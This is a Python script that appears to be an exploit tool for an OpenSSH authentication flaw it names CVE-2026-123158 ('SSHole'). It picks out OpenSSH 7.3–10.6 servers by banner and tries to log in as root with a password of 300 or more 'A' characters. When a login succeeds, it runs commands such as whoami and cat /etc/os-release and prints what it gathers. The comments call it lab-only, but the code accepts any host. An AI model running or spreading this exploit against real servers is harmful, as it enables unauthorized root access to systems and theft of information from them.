#!/usr/bin/env python3
# CVE-2026-123158 ("SSHole") concerns vulnerable OpenSSH releases whose
# password-authentication handling can be stressed by an excessively long
# password. This scanner first reads the SSH banner, identifies OpenSSH 7.3
# through 10.6 hosts for review, and then performs a controlled lab-only
# validation using a generated password of the requested length. It records
# whether authentication is rejected, the connection closes, or authentication
# succeeds; authenticated lab targets are queried for limited host evidence.
"""Scan SSH banners and perform the authorized lab validation step."""

from __future__ import annotations

import argparse
import json
import socket
import sys
from dataclasses import asdict, dataclass, field

import paramiko

from ssh_scanner import BannerInfo, scan_banner


LAB_COMMANDS = {
    "Hostname": "hostname",
    "OS Release": "cat /etc/os-release",
    "Uptime": "uptime",
    "Current User": "whoami",
}


@dataclass
class HostEvidence:
    label: str
    command: str
    stdout: str = ""
    stderr: str = ""
    exit_code: int | None = None
    error: str | None = None


@dataclass
class ScanResult:
    host: str
    port: int
    reachable: bool
    banner: str | None = None
    protocol: str | None = None
    software: str | None = None
    openssh_version: str | None = None
    review_required: bool = False
    login_attempted: bool = False
    password_length: int | None = None
    login_result: str | None = None
    host_evidence: list[HostEvidence] = field(default_factory=list)
    error: str | None = None


def read_banner(host: str, port: int, timeout: float) -> ScanResult:
    """Return a banner scan result for one host."""
    return _to_scan_result(scan_banner(host, port, timeout))


def _to_scan_result(info: BannerInfo) -> ScanResult:
    return ScanResult(**asdict(info))


def test_long_password(
    result: ScanResult,
    username: str,
    password_length: int,
    timeout: float,
) -> None:
    """Run the lab-only validation and collect evidence after authentication."""
    if not result.review_required:
        return

    result.login_attempted = True
    result.password_length = password_length
    password = "A" * password_length

    try:
        with _open_transport(result.host, result.port, timeout) as transport:
            result.login_result = _authenticate(
                transport, username, password
            )
            if transport.is_authenticated():
                result.host_evidence = _collect_host_evidence(transport, timeout)
    except (paramiko.SSHException, OSError, EOFError) as exc:
        result.login_result = _format_error("CONNECTION_ERROR", exc)


def _open_transport(host: str, port: int, timeout: float) -> paramiko.Transport:
    sock = socket.create_connection((host, port), timeout=timeout)
    transport = paramiko.Transport(sock)
    try:
        transport.banner_timeout = timeout
        transport.auth_timeout = timeout
        transport.start_client(timeout=timeout)
    except Exception:
        transport.close()
        raise
    return transport


def _authenticate(
    transport: paramiko.Transport,
    username: str,
    password: str,
) -> str:
    attempts: list[str] = []

    for attempt_number in range(1, 3):
        if not transport.is_active():
            attempts.append(f"ATTEMPT_{attempt_number}: CONNECTION_CLOSED")
            break

        try:
            transport.auth_password(
                username=username,
                password=password,
                fallback=False,
            )
        except paramiko.AuthenticationException:
            attempts.append(
                f"ATTEMPT_{attempt_number}: AUTHENTICATION_REJECTED"
            )
        except (paramiko.SSHException, EOFError, OSError) as exc:
            attempts.append(
                f"ATTEMPT_{attempt_number}: {_format_error('SSH_ERROR', exc)}"
            )
            break
        else:
            authenticated = transport.is_authenticated()
            status = "AUTHENTICATED" if authenticated else "NOT_AUTHENTICATED"
            attempts.append(f"ATTEMPT_{attempt_number}: {status}")
            if authenticated:
                break

    return " | ".join(attempts)


def _collect_host_evidence(
    transport: paramiko.Transport,
    timeout: float,
) -> list[HostEvidence]:
    return [
        _run_command(transport, label, command, timeout)
        for label, command in LAB_COMMANDS.items()
    ]


def _run_command(
    transport: paramiko.Transport,
    label: str,
    command: str,
    timeout: float,
) -> HostEvidence:
    evidence = HostEvidence(label=label, command=command)
    channel = None

    try:
        channel = transport.open_session(timeout=timeout)
        channel.settimeout(timeout)
        channel.exec_command(command)
        evidence.stdout = channel.makefile("r", -1).read().strip()
        evidence.stderr = channel.makefile_stderr("r", -1).read().strip()
        evidence.exit_code = channel.recv_exit_status()
    except (paramiko.SSHException, OSError, EOFError) as exc:
        evidence.error = _format_error(type(exc).__name__, exc)
    finally:
        if channel is not None:
            channel.close()

    return evidence


def _format_error(prefix: str, exc: Exception) -> str:
    return f"{prefix}: {type(exc).__name__}: {exc}"


def print_host_evidence(result: ScanResult) -> None:
    """Print authenticated host data after the connection summary."""
    if not result.host_evidence:
        return

    print(
        f"\n{'=' * 60}\n"
        f"HOST EVIDENCE: {result.host}:{result.port}\n"
        f"{'=' * 60}"
    )

    for evidence in result.host_evidence:
        print(f"\n[{evidence.label}]")
        print(f"Command: {evidence.command}")
        print(f"Exit code: {evidence.exit_code}")
        print("STDOUT:")
        print(evidence.stdout or "<no output>")
        if evidence.stderr:
            print("STDERR:")
            print(evidence.stderr)
        if evidence.error:
            print(f"ERROR: {evidence.error}")

    print(f"\n{'=' * 60}")


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="SSH banner scanner with OpenSSH 7.3-10.6 long-password test"
    )
    parser.add_argument("hosts", nargs="+", help="IP address or hostname(s) to inspect", default="10.129.248.123")
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--username", default="root")
    parser.add_argument(
        "--password-length",
        type=int,
        default=300,
        help="Length of the test password (minimum: 300)",
    )
    parser.add_argument("--json", action="store_true", dest="json_output")
    return parser


def main() -> int:
    parser = _build_parser()
    args = parser.parse_args()
    if args.password_length < 300:
        parser.error("--password-length must be at least 300")

    results = []
    for host in args.hosts:
        result = read_banner(host, args.port, args.timeout)
        if result.review_required:
            test_long_password(
                result,
                args.username,
                args.password_length,
                args.timeout,
            )
        results.append(result)

    if args.json_output:
        print(json.dumps([asdict(result) for result in results], indent=2))
    else:
        for result in results:
            _print_result(result)

    return 0 if all(result.reachable for result in results) else 1


def _print_result(result: ScanResult) -> None:
    if result.error:
        print(f"{result.host}:{result.port} ERROR {result.error}")
        return

    print(f"{result.host}:{result.port} {result.banner}")
    if result.login_attempted:
        print(
            "  OpenSSH 7.3-10.6 detected\n"
            f"  Password length: {result.password_length}\n"
            f"  Login result: {result.login_result}"
        )
    print_host_evidence(result)


if __name__ == "__main__":
    sys.exit(main())
